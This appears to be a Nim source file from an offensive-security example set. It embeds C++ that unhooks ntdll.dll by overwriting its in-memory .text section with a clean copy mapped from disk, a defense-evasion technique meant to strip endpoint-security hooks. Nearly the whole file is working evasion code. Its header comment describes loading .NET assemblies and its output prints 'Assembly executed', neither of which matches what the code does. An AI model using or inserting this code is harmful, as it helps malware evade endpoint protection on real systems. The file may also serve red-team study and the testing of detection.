#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause
    This was an initial attempt at trying to embed the CLR before Winim 3.6.0 was out (which now supports all of the necessary API calls to load .NET assemblies).
    If anything it was a pretty cool excercise and an example of how to embed C++ directly within Nim.
    Few thangs:
        - When using Nim's C++ backend and cross-compiling to Windows you need to statically link the binaries by passing the '-static' flag to the linker. 
          Otherwise the resulting binaries will **not** run (Seems like a bug?)
        - This particular example will only work on x64 machines and requires the metahost.h and mscoree.lib files (in the rsrc directory).
          Both of those files were stolen directly from my Windows VM. If you want to compile to x86 you need to grab the x86 version of mscoree.lib.
    Gr33tz & huge thanks to Pancho for helping me get this to work.
    References:
        - https://gist.github.com/xpn/e95a62c6afcf06ede52568fcd8187cc2#gistcomment-2553021
]#
import os

when not defined(cpp):
    {.error: "Must be compiled in cpp mode"}
# Stolen from https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++

{.emit: """
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>

int test()
{
    HANDLE process = GetCurrentProcess();
    MODULEINFO mi = {};
    HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
    
    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
    HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

    for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
        
        if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
            DWORD oldProtection = 0;
            bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
            memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
            isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
        }
    }
    
    CloseHandle(process);
    CloseHandle(ntdllFile);
    CloseHandle(ntdllMapping);
    FreeLibrary(ntdllModule);
    
    return 1;
}
""".}

proc test(): int
    {.importcpp: "test", nodecl.}

when isMainModule:
    sleep(15000)
    var result = test()
    echo "[*] Assembly executed: ", bool(result)
    sleep(10000)
